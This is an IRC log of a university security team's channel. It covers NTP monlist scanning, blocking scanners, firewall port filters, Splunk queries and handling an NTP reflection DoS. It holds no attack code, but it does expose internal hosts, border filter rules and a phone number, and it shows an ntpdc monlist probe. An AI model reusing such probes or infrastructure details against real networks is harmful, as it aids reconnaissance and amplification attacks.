2014-08-05 08:37:18	eyrich	well some one here will have to manage - so centos? 6.5?
2014-08-05 08:37:44	jazoff	ok
2014-08-05 09:04:27	eyrich	monlist scan complete
2014-08-05 09:04:36	eyrich	justs hosts on one subnet found
2014-08-05 09:04:44	eyrich	i sent email
2014-08-05 09:07:21	jazoff	any idea what those hosts are?
2014-08-05 09:07:46	wardog	jazoff: what neteng tools do we have some kind of api access to?
2014-08-05 09:07:53	wardog	Not including BHR
2014-08-05 09:08:10	jazoff	i got some stuff working for netdot, but it seemed to have no useful data in it
2014-08-05 09:08:43	wardog	Is that the NEW registration db?
2014-08-05 09:08:55	jazoff	i forget, it's A registration DB
2014-08-05 09:09:03	jazoff	but all it seemed to have was that a host was registered or not
2014-08-05 09:09:58	soehlert	working from home this morning, will be in later
2014-08-05 09:09:59	wardog	dnsworks says slevy for the few I've looked at so far
2014-08-05 09:10:07	wardog	Did you pass?
2014-08-05 09:10:08	jazoff	ah, found some activity from 141.142.212.210, looks like centos 6.5
2014-08-05 09:10:15	wardog	Or did you get gandafed?
2014-08-05 09:10:17	wardog	lfed
2014-08-05 09:12:15	wardog	damnit
2014-08-05 09:12:24	wardog	stupid ncsa id != campus id
2014-08-05 09:18:43	soehlert	I did pass
2014-08-05 09:25:08	wardog	w00t
2014-08-05 09:26:03	eyrich	for centos vms are you guys using e1000 or vmxnet3 adapters?
2014-08-05 09:29:03	soehlert	e1000 
2014-08-05 09:40:49	soehlert	eyrich: how come?
2014-08-05 09:49:08	eyrich	i was just wondering - vmxnet3 should offer better performance - although Im not sure howm much on linux machines.
2014-08-05 09:49:29	eyrich	afaik it no longer requires the vmware tools to be installed to add the drive
2014-08-05 09:49:33	eyrich	driver
2014-08-05 09:50:26	jazoff	linux seems to come with vmxnet3 these days
2014-08-05 09:50:34	jazoff	my laptop has it at least
2014-08-05 09:54:05	soehlert	i suppose we can switch them. to be honest i was just using the default
2014-08-05 09:54:17	soehlert	didnt pick that one or anything
2014-08-05 10:06:10	keist	eyrich: I've been using the vmxnet3 adapters
2014-08-05 10:15:51	jazoff	why does fog have qpid installed?
2014-08-05 10:17:09	jazoff	ok, acl test program updated
2014-08-05 10:17:35	soehlert	to be honest, it's probably because we didn't have a stripped down version of RHEL being installed when fog was created would be my guess
2014-08-05 10:21:27	wardog	how do we suddenly have 8 entitlements in rhn?
2014-08-05 10:21:29	jazoff	so, acl test program uses one or more ini files that can have sections, like
2014-08-05 10:21:32	jazoff	[bastions]
2014-08-05 10:21:32	jazoff	hosts = fog.ncsa.illinois.edu dew.ncsa.illinois.edu
2014-08-05 10:21:32	jazoff	open = 22
2014-08-05 10:21:32	jazoff	closed = 111 631 639
2014-08-05 10:21:48	jazoff	so, you run it and it will spit out
2014-08-05 10:21:49	jazoff	testing ncsa.ini, 1 tests
2014-08-05 10:21:49	jazoff	8 tests ran in 1 seconds
2014-08-05 10:21:49	jazoff	tests ok:     8
2014-08-05 10:21:50	jazoff	tests failed: 0
2014-08-05 10:22:35	soehlert	wardog: huh?
2014-08-05 10:22:37	wardog	Are none of the bastions set up with the new rhn account yet?
2014-08-05 10:22:56	soehlert	they should all be now
2014-08-05 10:23:07	wardog	Weird.
2014-08-05 10:23:09	soehlert	jazoff: we have to explicitly say all the ports that are closed?
2014-08-05 10:23:21	wardog	I can't seem to see them listed at all. Maybe I'm looking in the wrong spot
2014-08-05 10:23:23	soehlert	wardog: are you signed in under the right one. i saw 8 when I somehow signed in as you
2014-08-05 10:23:37	wardog	ncsa.secops
2014-08-05 10:24:09	wardog	0 systems entitled, 8 available entitlements (8 total)
2014-08-05 10:25:00	soehlert	hmm ya fog says its not registered...this is strange, i registered it the day we got the licenses and it worked at the time..
2014-08-05 10:25:14	soehlert	i'll go through and try again i suppose, but that still doesn't explain why we have 8..
2014-08-05 10:25:16	wardog	How did you register them?
2014-08-05 10:25:23	wardog	I don't see any activation keys set up.
2014-08-05 10:25:34	soehlert	i don't remember the commands exactly i will have to look and find the docs i used
2014-08-05 10:26:00	jazoff	soehlert: no.. you would list the ports that should be closed
2014-08-05 10:26:12	jazoff	you could list a range if you wanted...
2014-08-05 10:26:22	soehlert	huh? thats what i just asked
2014-08-05 10:26:29	jazoff	oh, i guess
2014-08-05 10:26:37	soehlert	wardog: subscription-manager register --autosubscribe and then using the sign in stuff from lastpass
2014-08-05 10:26:48	jazoff	so, if I move port 22 to closed it will fail:
2014-08-05 10:26:50	jazoff	+----------------+------+--------+----------+--------+
2014-08-05 10:26:50	jazoff	|       ip       | port | status | expected | actual |
2014-08-05 10:26:50	jazoff	+----------------+------+--------+----------+--------+
2014-08-05 10:26:50	jazoff	| 141.142.148.15 |  22  | failed |  closed  |  open  |
2014-08-05 10:26:51	soehlert	though i had issues on one of the bw bastions i remember
2014-08-05 10:26:51	jazoff	| 141.142.236.21 |  22  | failed |  closed  |  open  |
2014-08-05 10:26:53	wardog	Did you use the right account?
2014-08-05 10:26:54	jazoff	+----------------+------+--------+----------+--------+
2014-08-05 10:26:54	wardog	:D
2014-08-05 10:27:06	soehlert	wardog: it cant be that because its not registered at all right?
2014-08-05 10:27:39	wardog	I think ADS is using the old site account so the old account would have worked.
2014-08-05 10:27:41	soehlert	jazoff: but i dont need to say closed 1-21,23-65535 right?
2014-08-05 10:27:52	wardog	Let me check
2014-08-05 10:27:57	jazoff	oh, you would
2014-08-05 10:27:58	soehlert	wardog: but it says its not registered so that must not be what happened
2014-08-05 10:28:15	wardog	ok, yeah, permission error. so no.
2014-08-05 10:28:20	soehlert	jazoff: ahh ok. i guess that works. seems fair to assume if it's not open it should be closed though no?
2014-08-05 10:29:08	jazoff	yeah...
2014-08-05 10:29:32	jazoff	I was thinking more you would list out the ports you knew had services on but should be filtered
2014-08-05 10:29:40	jazoff	to avoid having to scan 65536 ports
2014-08-05 10:31:16	wardog	soehlert: you need to redirect /etc/sysconfig/rhn/up2date to RHN's servers, not CITES
2014-08-05 10:36:05	jazoff	oooooooo http://www.drdobbs.com/embedded-systems/nvidia-jetson-tk1-reviewed/240168804
2014-08-05 10:50:36	eyrich	i dont like that it needs a fan. the processor is very cool. But I like no moving parts for these littl eembedded boxes
2014-08-05 10:52:10	jazoff	it has some odd hw choices (clearly it is designed for gpu stuff) but still pretty cool
2014-08-05 10:52:32	jazoff	I may end up building a NUC though
2014-08-05 10:52:50	eyrich	might do well has a hashing appliance
2014-08-05 12:35:42	soehlert	keist: i presume the nagios myproxy.ncsa.uiuc.edu errors are because that one is retired and the checks need to go away. Is that true eyrich 
2014-08-05 13:49:13	keist	soehlert: yep, just took care of
2014-08-05 13:49:18	soehlert	cool
2014-08-05 14:42:10	soehlert	wardog: "WARNING
2014-08-05 14:42:10	soehlert	This system has already been registered with Red Hat using RHN Classic."
2014-08-05 14:42:16	soehlert	soooo now im confused
2014-08-05 14:44:42	wardog	hmm
2014-08-05 14:44:46	wardog	fog right?
2014-08-05 14:45:03	soehlert	ya and yet Loaded plugins: product-id, refresh-packagekit, rhnplugin, subscription-manager
2014-08-05 14:45:03	soehlert	This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.
2014-08-05 14:45:03	soehlert	There was an error communicating with RHN.
2014-08-05 14:45:03	soehlert	RHN Satellite or RHN Classic support will be disabled."
2014-08-05 14:45:41	soehlert	ahhh its trying to point it to rhn.cites.illinois.edu
2014-08-05 14:52:23	soehlert	nvm thats what you were saying earlier :)
2014-08-05 15:09:17	wardog	:D
2014-08-05 16:03:40	soehlert	is the host "aristatest" still in use?
2014-08-05 16:10:38	jazoff	you mean the switch? yes
2014-08-05 16:10:55	soehlert	ah idk what it is. hostname is just aristatest
2014-08-05 16:10:55	soehlert	k thanks
2014-08-05 16:11:15	jazoff	10.142.148.8 ?
2014-08-05 16:11:20	soehlert	ya
2014-08-06 10:36:26	wardog	So, Vlad's in town.
2014-08-06 10:36:30	wardog	Moved back last wednesday
2014-08-06 10:36:55	soehlert	was he in the building yesterday? i swear I saw him but adam made me think i was going crazy
2014-08-06 10:37:55	wardog	It's possible.
2014-08-06 10:38:11	wardog	I don't know, I only found out today
2014-08-06 10:43:32	keist	anyone know where I can print a bunch of flyers?
2014-08-06 10:43:38	keist	preferably free
2014-08-06 10:44:45	wardog	fedex. Kinda free.
2014-08-06 10:44:48	wardog	Flyers for what?
2014-08-06 10:45:27	keist	LUG and OpenNSM 
2014-08-06 10:45:37	keist	promoting to students
2014-08-06 10:46:40	wardog	Are you an official RSO?
2014-08-06 10:46:58	soehlert	RSO would be the way to go
2014-08-06 10:47:23	wardog	http://union.illinois.edu/get-involved/office-of-registered-organizations
2014-08-06 10:47:48	wardog	It's their job to help promote
2014-08-06 10:48:06	keist	OpenNSM is not, LUG may be though. Will have to ask Wayland
2014-08-06 10:48:12	keist	kk, will look into it
2014-08-06 10:48:41	wardog	ACM has an office with a printer.
2014-08-06 11:29:26	soehlert	so people trying to steal science journals through us huh?
2014-08-06 11:31:10	wardog	NCSA?
2014-08-06 11:31:18	wardog	I saw that on campus all the time.
2014-08-06 11:31:21	soehlert	ya all those phalanx alerts
2014-08-06 11:31:24	wardog	ah
2014-08-06 11:31:25	soehlert	look at em.
2014-08-06 11:31:50	wardog	yeah, fairly common. Usually from compromised VPN accounts, discovered proxies, and the library proxy system
2014-08-06 11:33:32	wardog	I wonder if that actually works in some version of sshd.
2014-08-06 11:33:42	jazoff	doubtful
2014-08-06 11:33:46	soehlert	idk
2014-08-06 11:33:51	jazoff	looks like just a stupid scanner that tries HTTP on any open port it finds
2014-08-06 11:33:56	soehlert	wardog: oh ya we used to see this alot
2014-08-06 11:34:16	soehlert	worth bhr'ing?
2014-08-06 11:34:30	wardog	At that rate. I'm good with it.
2014-08-06 11:34:40	wardog	bhring that is
2014-08-06 11:55:24	jazoff	did someone bhr that?
2014-08-06 11:55:30	soehlert	i did
2014-08-06 11:55:32	soehlert	why?
2014-08-06 11:55:42	jazoff	oh, what IP was it?
2014-08-06 11:55:46	jazoff	i think i was looking at something else
2014-08-06 11:55:57	soehlert	there were two
2014-08-06 11:55:58	soehlert	59.55.47.4
2014-08-06 11:56:08	soehlert	and 115 something
2014-08-06 11:56:26	jazoff	115.148.65.93? i don't think that one is blocked
2014-08-06 11:57:08	soehlert	i defintiely blocked it
2014-08-06 11:57:22	soehlert	but ya it says its not...
2014-08-06 11:57:36	jazoff	oooh
2014-08-06 11:57:36	jazoff	Aug  6 11:35:28 cygnus BHR_BLOCK: IP=115.148.109.221 HOSTNAME=null WHO=soehlert WHY="Journal Scanning" UNTIL=1409934928 DURATION=2592000
2014-08-06 11:57:38	jazoff	Aug  6 11:35:46 cygnus BHR_BLOCK: IP=59.55.47.4 HOSTNAME=null WHO=soehlert WHY="Journal Scanning" UNTIL=1409934946 DURATION=2592000
2014-08-06 11:57:58	soehlert	so it should be right?
2014-08-06 11:58:04	jazoff	different ip
2014-08-06 11:58:20	soehlert	oh weird there must have been three and i only saw the first octet and thought it was the same
2014-08-06 12:03:29	soehlert	ok all three bhr'd now
2014-08-06 12:04:20	jazoff	ninfo bhr_list 115.148.0.0/16
2014-08-06 12:04:21	ncsabot	Error running plugin
2014-08-06 12:04:24	jazoff	doh
2014-08-06 12:04:31	soehlert	can you do cidr?
2014-08-06 12:04:42	jazoff	ninfo bhlist 115.148.0.0/16
2014-08-06 12:04:45	ncsabot	IP: 115.148.64.157 Who: bro Why: Scan::Port_Scan: 115.148.64.157 scanned at least 102 unique ports of host 141.142.225.65 in 0m0s When: 2014-07-21T03:13:52 Expire: 2014-08-20T03:13:52
2014-08-06 12:04:46	ncsabot	IP: 115.148.65.154 Who: bro Why: Scan::Address_Scan: 115.148.65.154 scanned at least 37 unique hosts on port 23/tcp in 0m11s When: 2014-07-13T12:30:24 Expire: 2014-08-12T12:30:24
2014-08-06 12:04:46	ncsabot	IP: 115.148.66.116 Who: bro Why: Scan::Port_Scan: 115.148.66.116 scanned at least 102 unique ports of host 141.142.200.1 in 0m0s When: 2014-07-21T07:13:23 Expire: 2014-08-20T07:13:23
2014-08-06 12:04:46	ncsabot	IP: 115.148.67.8 Who: bro Why: Scan::Port_Scan: 115.148.67.8 scanned at least 102 unique ports of host 141.142.242.1 in 0m0s When: 2014-07-10T03:09:05 Expire: 2014-08-09T03:09:05
2014-08-06 12:04:49	ncsabot	IP: 115.148.98.91 Who: bro Why: Scan::Address_Scan: 115.148.98.91 scanned at least 37 unique hosts on port 23/tcp in 0m14s When: 2014-07-15T02:07:18 Expire: 2014-08-14T02:07:18
2014-08-06 12:04:52	ncsabot	IP: 115.148.98.210 Who: bro Why: Scan::Address_Scan: 115.148.98.210 scanned at least 37 unique hosts on port 23/tcp in 0m2s When: 2014-07-22T14:57:24 Expire: 2014-08-21T14:57:24
2014-08-06 12:04:54	ncsabot	IP: 115.148.99.92 Who: bro Why: Scan::Address_Scan: 115.148.99.92 scanned at least 37 unique hosts on port 23/tcp in 0m6s When: 2014-07-18T16:51:37 Expire: 2014-08-17T16:51:37
2014-08-06 12:04:55	jazoff	ooooh was not expecting that
2014-08-06 12:04:58	ncsabot	IP: 115.148.107.11 Who: bro Why: Scan::Port_Scan: 115.148.107.11 scanned at least 102 unique ports of host 141.142.134.76 in 0m0s When: 2014-07-16T02:24:25 Expire: 2014-08-15T02:24:25
2014-08-06 12:05:01	ncsabot	IP: 115.148.107.75 Who: bro Why: Scan::Port_Scan: 115.148.107.75 scanned at least 102 unique ports of host 141.142.132.2 in 0m0s When: 2014-07-18T08:27:48 Expire: 2014-08-17T08:27:48
2014-08-06 12:05:03	ncsabot	IP: 115.148.107.159 Who: bro Why: Scan::Port_Scan: 115.148.107.159 scanned at least 102 unique ports of host 141.142.232.1 in 0m0s When: 2014-07-22T06:50:12 Expire: 2014-08-21T06:50:12
2014-08-06 12:05:05	ncsabot	IP: 115.148.107.195 Who: bro Why: Scan::Port_Scan: 115.148.107.195 scanned at least 102 unique ports of host 141.142.135.254 in 0m1s When: 2014-07-16T06:12:06 Expire: 2014-08-15T06:12:06
2014-08-06 12:05:08	ncsabot	IP: 115.148.108.92 Who: bro Why: Scan::Port_Scan: 115.148.108.92 scanned at least 102 unique ports of host 141.142.211.1 in 0m0s When: 2014-07-22T23:53:07 Expire: 2014-08-21T23:53:07
2014-08-06 12:05:11	ncsabot	IP: 115.148.108.241 Who: bro Why: Scan::Port_Scan: 115.148.108.241 scanned at least 102 unique ports of host 141.142.148.1 in 0m0s When: 2014-07-20T23:04:05 Expire: 2014-08-19T23:04:05
2014-08-06 12:05:15	ncsabot	IP: 115.148.109.221 Who: soehlert Why: Journal Scanning When: 2014-08-06T16:35:28 Expire: 2014-09-05T16:35:28
2014-08-06 12:05:15	soehlert	damn you jazoff but also damn you this /16
2014-08-06 12:05:21	wardog	102 ports...
2014-08-06 12:06:37	jazoff	yeah, we just lowered that
2014-08-06 12:06:56	soehlert	102 seems pretty arbitrary
2014-08-06 12:09:43	jazoff	oh, I think it was 100
2014-08-06 12:09:57	jazoff	102 is just from the lag in the event firing i think
2014-08-06 12:10:05	soehlert	ahh ok. 100 makes way more sense haha
2014-08-06 13:06:48	soehlert	so i think there's no reason to keep squall alive. anyone disagree?
2014-08-06 13:08:06	wardog	which is squall?
2014-08-06 13:09:28	wardog	Ah, the old puppet console
2014-08-06 13:09:33	soehlert	ya
2014-08-06 13:30:09	wardog	jazoff: you around?
2014-08-06 13:30:12	jazoff	yepp
2014-08-06 13:30:17	wardog	call my phone
2014-08-06 13:30:25	wardog	doing quick whiparound.
2014-08-06 13:30:33	wardog	217-333-2876
2014-08-06 14:23:37	keist	removed squall from nagios
2014-08-06 14:24:06	wardog	keist: what projects are on your plate lately?
2014-08-06 14:24:57	soehlert	thanks for catching it. was about to let you know
2014-08-06 14:25:23	keist	not too much other than nagios and related touch ups and preparing for BroCon (speaking and demo'ing Bro Live) 
2014-08-06 14:26:23	keist	I plan to start the malware analysis sandbox project after
2014-08-06 14:29:36	keist	oh and CIF is my last thing to get puppetized
2014-08-06 14:30:10	keist	have some manifests started for that
2014-08-06 17:14:48	keist	logs were being missed on the relays, see commit 3688d65f80aeedf898594e01a6c5ab02824ee9bb ``git show 3688d65f80aeedf898594e01a6c5ab02824ee9bb''
2014-08-06 17:15:00	keist	in the puppet repo
2014-08-06 17:26:36	jazoff	or the link in #ncsabot :)
2014-08-07 08:20:05	jazoff	keist: started building out the ansible stuff
2014-08-07 08:22:47	jazoff	is the ansible-sec host ready?
2014-08-07 09:10:27	keist	jazoff: not quite, I was holding on a DNS request for a few weeks that was just fulfilled 2 days ago
2014-08-07 09:12:25	jazoff	k
2014-08-07 09:13:25	keist	in a workshop all week and today is hands on so not going to be able to work on it 
2014-08-07 09:13:30	keist	:( 
2014-08-07 09:15:50	wardog	CVE-2014-3560
2014-08-07 09:16:05	wardog	https://www.samba.org/samba/security/CVE-2014-3560
2014-08-07 09:22:39	jazoff	keist: no problem, it can wait
2014-08-07 09:22:44	jazoff	still fleshing out the roles and stuff
2014-08-07 09:23:23	jazoff	wardog: eek, is that vulnerable over udp?
2014-08-07 09:27:07	wardog	jazoff: still looking into it. I would think so.
2014-08-07 09:27:28	jazoff	that's problematic if the urpf still isn't working
2014-08-07 09:27:43	jazoff	actually, are those ports acled at the border?
2014-08-07 09:27:53	wardog	I know they are for campus.
2014-08-07 09:27:57	wardog	Not sure about here...
2014-08-07 09:32:10	jazoff	checking at home, i have nmbd running on my raspberry pi...
2014-08-07 09:32:17	jazoff	listens on udp 137 and 138 
2014-08-07 09:37:50	jazoff	i see inbound udp 138 to 143.219.85.200 and similar ips
2014-08-07 09:38:12	wardog	143?
2014-08-07 09:38:23	jazoff	yeah
2014-08-07 09:38:30	jazoff	i think that's that weird subnet I noticed when I first started
2014-08-07 09:38:38	jazoff	but I don't see any external -> 141.142 on those ports
2014-08-07 09:38:38	wardog	Oh right, Dow
2014-08-07 09:38:40	jazoff	so i think it might be filtered
2014-08-07 09:38:50	jazoff	ah, yeah
2014-08-07 09:38:56	jazoff	but it couldn't hurt to confirm with neteng
2014-08-07 09:41:55	wardog	term reject-filtered-services-traffic {
2014-08-07 09:41:56	wardog	  /* smtp (25), dns (53), linuxconf (98), sunrpc (111), netbios (135,137,138,139), snmp (161), snmptrap (162), cifs (445), syslog (514), printer (515), sendmail submission (587), kerberos-adm (749), citrix-ica (1494), sgi-arrayd (5434), jetdirect (9100), ws-management (5985), power shell (5986) */
2014-08-07 09:41:59	wardog	  from {
2014-08-07 09:42:01	wardog	    protocol [ tcp udp ];
2014-08-07 09:42:04	wardog	    destination-port [ 25 53 98 111 135 137 138 139 161 162 445 514 515 587 749 1494 5434 9100 5985 5986 623 ];
2014-08-07 09:42:07	wardog	  }
2014-08-07 09:42:09	wardog	  then {
2014-08-07 09:42:12	wardog	    count reject-filtered-services-traffic;
2014-08-07 09:42:14	wardog	    sample;
2014-08-07 09:42:17	wardog	    reject;
2014-08-07 09:42:19	wardog	  }
2014-08-07 09:42:19	jazoff	awesome
2014-08-07 09:42:22	wardog	}
2014-08-07 09:42:24	wardog	25?
2014-08-07 09:42:26	wardog	Those are the current blocks
2014-08-07 09:42:34	wardog	I know we run some mail servers...
2014-08-07 09:43:01	jazoff	is there an exception above that?
2014-08-07 09:43:06	wardog	must be
2014-08-07 09:44:01	jazoff	so, i guess nothing to do :)
2014-08-07 09:44:24	wardog	Short blog post and done. Need to find info on mitigation though.
2014-08-07 09:44:39	jazoff	upgrade or disable nmbd i'd imagine
2014-08-07 09:44:42	keist	building a cluster with the aid of puppet: http://web.rcac.purdue.edu/~sharrell/buildacluster/
2014-08-07 09:44:44	jazoff	nmdb should really be optional
2014-08-07 09:44:54	keist	^ material for today if anyone is interested
2014-08-07 09:48:18	jazoff	disable netbios = yes
2014-08-07 09:48:20	jazoff	in the samba config
2014-08-07 11:16:18	keist	test
2014-08-07 11:16:58	jazoff	test?
2014-08-07 11:17:33	soehlert	1, 2, 3
2014-08-07 11:18:44	wardog	sibilance.... sibilance...
2014-08-07 11:32:09	soehlert	keist: can i delete your old rhel versions of vms on esx?
2014-08-07 11:43:01	keist	what do you see that I have left?
2014-08-07 11:43:29	keist	i can only think of one, but am forgetful, and that's nagios-console-sec
2014-08-07 11:43:32	soehlert	theres a turned off version of: git-sec, nagios-console-sec, nagios-sec-centos(?)
2014-08-07 11:44:01	keist	oh yeah, they can all go
2014-08-07 11:44:03	keist	thanks
2014-08-07 11:46:36	soehlert	oh and analysis-sec-orig
2014-08-07 11:47:36	soehlert	and nagios-console-sec-rehat. jeeze too much "nagios-*" to parse
2014-08-07 11:58:17	wardog	nagios-nagios-nagios
2014-08-07 12:00:06	soehlert	keist: also, when you get a chance can you mark the machines as centos that you've switched over please?
2014-08-07 12:08:11	soehlert	in the secops repo that is
2014-08-07 13:15:33	keist	soehlert: done
2014-08-07 13:15:42	soehlert	thanks
2014-08-07 13:29:05	wardog	what's the web interface for git?
2014-08-07 13:29:20	wardog	found it.
2014-08-07 13:29:25	soehlert	https://git-sec.internal
2014-08-07 13:29:34	soehlert	you could go to the portal too, that's what it's for :)
2014-08-07 13:42:12	wardog	What portal?
2014-08-07 13:42:13	wardog	j/k
2014-08-07 13:42:27	wardog	Does Bro detect samba/cifs servers?
2014-08-07 13:43:31	jazoff	well it will definitely detect that under known services
2014-08-07 13:44:03	jazoff	source=*known_services* port_num=445
2014-08-07 13:44:06	jazoff	try that in splunk
2014-08-07 13:45:05	jazoff	or over the last week/moth:
2014-08-07 13:45:06	jazoff	source=*known_services* port_num=445 | top limit=1000 src
2014-08-07 13:45:20	jazoff	looks like there are 7 that bro sees
2014-08-07 15:26:06	wardog	All but 1 are ITS.
2014-08-07 15:55:56	wardog	Jira lets you stalk.. >| okay, I see where it was. I watched it through         erichays~ "Unite or Di
2014-08-07 15:56:00	wardog	hmm
2014-08-07 15:56:01	wardog	weird
2014-08-07 15:56:12	wardog	meant to paste this: Justin Azoff is looking at this issue.
2014-08-07 15:58:08	jazoff	what issue?
2014-08-07 19:36:26	wardog	A JIRA ticket
2014-08-08 10:37:21	keist	lol big day for me: https://github.com/netsniff-ng/netsniff-ng/blob/master/AUTHORS#L18 
2014-08-08 10:50:58	jazoff	:)
2014-08-08 15:41:23	soehlert	jazoff: whats the deal with netflowdev-sec?
2014-08-08 16:23:45	jazoff	no idea
2014-08-08 16:23:49	jazoff	i rememebr this coming out a while ago
2014-08-11 07:22:38	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-08-11 07:50:54	-->	eyrich (eyrich@D077DE37.62651FD3.B1B5B983.IP) has joined #security
2014-08-11 12:16:16	soehlert	hmm ok. that's strange. so unless wardog knows what it is that means it came up recently, but none of us knows what it is
2014-08-11 12:16:53	soehlert	in other news, i see your udpdos script is working.
2014-08-11 12:27:14	jazoff	wellll, "working" :)
2014-08-11 12:28:07	jazoff	i think using netflow might be easier in the long run
2014-08-11 12:29:33	jazoff	one thing I did find when looking at udp stuff is that the guy that was running bittorrent a while ago is still running it
2014-08-11 12:29:48	jazoff	he's using uTorrent with the UTP mode so he shows up as the top UDP host
2014-08-11 13:25:22	soehlert	ya we don't necessarily have a problem with bittorrent so there's not much we can do
2014-08-11 13:28:07	jazoff	ah,, but he's using the tvtorrents tracker, which is probably not a good thing
2014-08-11 13:28:29	jazoff	(that's what the issue was last time around)
2014-08-11 13:28:41	jazoff	i think warren sent it over to the helpdesk, not sure though
2014-08-11 13:34:41	soehlert	haha ah yes then that is probably bad
2014-08-11 13:34:51	soehlert	though we arent POC on infringment stuff
2014-08-11 13:39:37	jazoff	yeah
2014-08-11 13:39:56	jazoff	more an AUP thing then a security thing
2014-08-11 13:40:33	soehlert	right. though adam may have a say in things i think actually neteng is listed as contact
2014-08-11 13:49:17	jazoff	ok, late lunch
2014-08-11 14:10:50	jazoff	soehlert: so, puppet all set now?
2014-08-11 14:11:33	soehlert	as in puppet master and adding hosts and whatnot? yes
2014-08-11 14:11:33	soehlert	i think some agents are having issues with being disabled or whatever they call it. aka not checking in in a reasonable time.
2014-08-11 14:12:17	jazoff	ah, is the pe-puppet service running?
2014-08-11 14:13:25	soehlert	its happened with it running and (obviously) if it's not running
2014-08-11 14:13:37	jazoff	oh
2014-08-11 14:13:51	soehlert	not a top priority yet though. testingn some things occasionally to see if i can get a fix
2014-08-11 14:15:32	soehlert	and in repo sec's case it was off but idk why
2014-08-11 14:15:32	soehlert	its chkconfiged on and was running before
2014-08-11 14:15:47	jazoff	i may haev turned it off during testing
2014-08-11 14:16:04	soehlert	ahh hm
2014-08-11 14:18:07	soehlert	that would change the equation, but not worried about it super much atm
2014-08-12 07:44:47	jazoff	141.142.234.46 took part in an ntp DoS..
2014-08-12 07:44:51	jazoff	the bro script actually worked :)
2014-08-12 07:44:56	jazoff	Message: UDP DoS between 198.148.85.92:41145/udp and 141.142.234.46:123/udp - 5332104 bytes
2014-08-12 07:45:10	jazoff	jazoff@air  ~  $ ntpdc -n -c monlist 141.142.234.46
2014-08-12 07:45:10	jazoff	remote address          port local address      count m ver rstr avgint  lstint
2014-08-12 07:45:12	jazoff	===============================================================================
2014-08-12 07:45:15	jazoff	66.56.13.26            50870 141.142.234.46         2 7 2      0     27       0
2014-08-12 07:45:18	jazoff	5.254.116.17              80 141.142.234.46      5275 7 2      0      0       0
2014-08-12 07:45:21	jazoff	130.126.24.53            123 141.142.234.46      3341 4 4      0   1023     749
2014-08-12 07:45:24	jazoff	etc
2014-08-12 07:59:56	jazoff	who do we tell about these again? last time I used help@ and they seemed confused
2014-08-12 09:43:10	jazoff	ok, well i'll send somethign to help :)
2014-08-12 12:10:37	soehlert	help-its would be my guess
2014-08-12 12:11:52	jazoff	ah
2014-08-12 12:12:09	jazoff	last time I sent something to help they wrote back asking if they should send it to security
2014-08-12 12:12:21	soehlert	hahah i mean sure, but then theyd just get it back :)
2014-08-12 14:22:42	soehlert	eyrich: is it just configured improperly or is it actually being used for a reflection attack currently?
2014-08-12 14:23:04	jazoff	was both, now just misconfigured
2014-08-12 14:23:24	jazoff	oh, actually, someone just started using it again
2014-08-12 14:23:39	jazoff	i've been trying to avoid null routing it since it seems like it is a busy web server
2014-08-12 14:24:04	soehlert	i think its just the informatics landing page
2014-08-12 14:24:34	soehlert	so its not like the bw portal or something that would kill someone's work
2014-08-12 14:25:29	eyrich	we will see if borris replies
2014-08-12 14:48:43	jazoff	i null routed 46.28.204.61 for 1 day (current ntp dos victim)
2014-08-12 14:51:14	jazoff	meh, a lot more destinations popped up
2014-08-12 15:04:28	eyrich	bhr it
2014-08-12 15:05:31	soehlert	wait wait wait. lets all get on the same page. is someone bhr'ing it?
2014-08-12 15:06:19	jazoff	i have not
2014-08-12 15:06:28	jazoff	i was trying to find a middle ground and BHR the ntp dos destinations
2014-08-12 15:06:54	soehlert	ok we were told to bhr it and eyrich said he was gonna then he told you to so i just wnated to make sure we knew who was doing it haha
2014-08-12 15:07:09	jazoff	i will block now
2014-08-12 15:08:08	jazoff	ok
2014-08-12 15:08:25	jazoff	verified block from GA
2014-08-12 15:09:54	soehlert	sweet thanks
2014-08-12 15:11:23	jazoff	would like to get a ncsabot -> bhr interface going at some point
2014-08-12 15:11:48	jazoff	i mean, you can query but that goes though the bhlist or splunk 
2014-08-12 15:11:52	soehlert	don't we have that? cant we do bhr info on things?
2014-08-12 15:11:55	soehlert	ahhh ok nvm
2014-08-12 15:12:06	jazoff	yeah..
2014-08-12 15:12:11	jazoff	ninfo  bhlist 141.142.234.46
2014-08-12 15:12:12	ncsabot	Error running plugin
2014-08-12 15:12:14	jazoff	doh
2014-08-12 15:12:17	jazoff	ninfo bhlist 141.142.234.46
2014-08-12 15:12:18	ncsabot	IP: 141.142.234.46 Who: jazoff Why: ntp DoS When: 2014-08-12T20:07:29 Expire: never
2014-08-12 15:13:55	jazoff	but it could be nice to be able to do 'bhlist remove 141.142.234.46'
2014-08-12 15:14:03	soehlert	ya that'd be awesome
2014-08-12 15:14:20	soehlert	it's a bit of a hassle to go open the portal because i never remmeber the url, then go there and log in and all that 
2014-08-12 15:17:40	soehlert	anyone got a good name for the ssh type for our regular hosts that just do kerb auth behind the bastions?
2014-08-12 15:20:03	jazoff	standard?
2014-08-12 15:20:35	soehlert	i guess. i was hoping something short that lent itself to what was different about the hosts, but i guess that won't be easy to so standard works
2014-08-12 15:21:57	jazoff	well different how?
2014-08-12 15:22:13	jazoff	standard and bastian make sense to me
2014-08-12 15:22:28	soehlert	different as in what makes it different than the bastion or intra_bastion ones, but i guess bastion makes itself different
2014-08-12 15:22:28	soehlert	im going with standard
2014-08-12 15:43:19	jazoff	so yeah.. need to think about the BHR and how the api (or rather, lack of api) works
2014-08-12 15:43:46	jazoff	it would be pretty easy to make a simple version of the existing cgi that just responds in json, but then we still have teh weird authentication issue
2014-08-12 16:01:32	jazoff	it might be easy enough to tweak the apache config to do basic auth as well
2014-08-12 16:14:57	keist	Patrick asked me, suggested by Randy, if I was writing a log management best practices document. Know anything about i?
2014-08-12 16:15:00	keist	it*
2014-08-12 16:31:35	soehlert	know anything about you writing one? no.
2014-08-12 16:31:43	soehlert	i would assume you'd know that best though..
2014-08-12 16:33:12	soehlert	keist: got some polot rsyslog questions for you tomorrow. 
2014-08-12 17:18:05	keist	lol
2014-08-12 17:19:17	keist	kk. I was just wondering if anyone knew about a document that's supposed to be made. I was hoping it wasn't mentioned to me :) because then I had completely forgotten
2014-08-12 17:20:30	keist	ugh, I need to write those nagios checks for Terry. I'm sick of Nagios lol
2014-08-12 17:23:39	<--	keist (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Ping timeout)
2014-08-12 17:37:31	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
